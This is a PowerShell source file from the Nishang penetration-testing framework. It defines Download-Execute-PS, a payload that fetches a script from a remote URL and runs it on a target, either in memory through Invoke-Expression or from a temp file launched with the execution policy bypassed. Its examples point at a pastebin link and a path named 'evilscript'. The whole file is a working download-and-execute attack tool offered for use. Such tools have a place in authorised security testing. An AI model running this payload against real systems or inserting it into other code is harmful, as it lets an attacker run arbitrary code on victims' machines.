
<#
.SYNOPSIS
Nishang Payload which downloads and executes a powershell script.

.DESCRIPTION
This payload downloads a powershell script from specified URL and then executes it on the target.

.PARAMETER ScriptURL
The URL from where the powershell script would be downloaded.

.EXAMPLE
PS > Download-Execute-PS http://pastebin.com/raw.php?i=jqP2vJ3x

.EXAMPLE
PS > Download-Execute-PS http://script.alteredsecurity.com/evilscript -nodownload
The above command does not dowload the script file to disk.

.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>




function Download-Execute-PS
{
    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ScriptURL,

        [Parameter(Position = 1)]
        [Switch]
        $nodownload
    )

    if ($nodownload -eq $true)
    {
        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"));
    }
    
    else
    {
        $webclient = New-Object System.Net.WebClient
        $file1 = "$env:temp\deps.ps1"
        $webclient.DownloadFile($ScriptURL,"$file1")
        $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
        $pastevalue
    }
}


